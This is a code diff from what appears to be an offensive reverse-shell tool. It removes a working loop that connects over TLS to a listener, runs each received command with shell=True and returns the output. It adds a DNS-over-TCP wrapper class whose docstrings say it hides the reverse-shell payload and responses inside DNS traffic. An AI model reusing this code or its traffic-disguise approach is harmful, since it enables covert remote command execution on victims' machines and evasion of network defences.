@@ -45,38 +45,51 @@ under certain conditions.
 __license__ = license
 __copyright__ = copyright
 
-__all__ = []
+__all__ = ["DNS"]
 
-print(copyright)
-
-from os.path import join
-from socket import socket
-from contextlib import suppress
-from subprocess import run, PIPE
-from ssl import SSLContext, PROTOCOL_TLS_CLIENT
-
-context = SSLContext(PROTOCOL_TLS_CLIENT)
-context.load_verify_locations(join("..", "server.crt"))
+from .dns import DNS
 
 
-def sendall(data):
-    chunk = data[:30000]
-    data = data[30000:]
-    while chunk:
-        ss.sendall(chunk)
-        chunk = data[:30000]
-        data = data[30000:]
+class DOT(DNS):
+    """
+    This class parses and writes DNS over TCP request and response.
+    """
 
+    def __init__(self):
+        self.dns_id = b"\x33\x66"
 
-data = b" "
-while True:
-    with suppress(Exception):
-        s = socket()
-        ss = context.wrap_socket(s, server_hostname="localhost")
-        ss.connect(("127.0.0.1", 1337))
-        sendall(data)
-        command = ss.recv(65535).decode()
-        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
-        data = p.stdout or p.stderr or b" "
-        ss.close()
-        s.close()
+    def parse(self, data: bytes) -> bytes:
+        """
+        This method parses DNS over TCP query and response.
+        """
+
+        return super().parse(data[2:])
+
+    parse_request = parse
+    parse_response = parse
+
+    def tcp_wrapper(self, data: bytes) -> bytes:
+        """
+        This method wraps DNS packets (queries and answers) to DNS over TCP.
+        """
+
+        data_length = len(data)
+        return (
+            data_length.to_bytes(2) if data_length < 65535 else b"\xff\xff"
+        ) + data
+
+    def wrap_response(self, data: bytes, is_encrypted: bool = False) -> bytes:
+        """
+        This method writes data in DNS over TCP response to
+        hide ReverseShell payload in DNS traffic.
+        """
+
+        return self.tcp_wrapper(super().wrap_response(data))
+
+    def wrap_request(self, data: bytes, is_encrypted: bool = False) -> bytes:
+        """
+        This method writes data in DNS over TCP query to hide
+        ReverseShell response in HTTP traffic.
+        """
+
+        return self.tcp_wrapper(super().wrap_request(data))
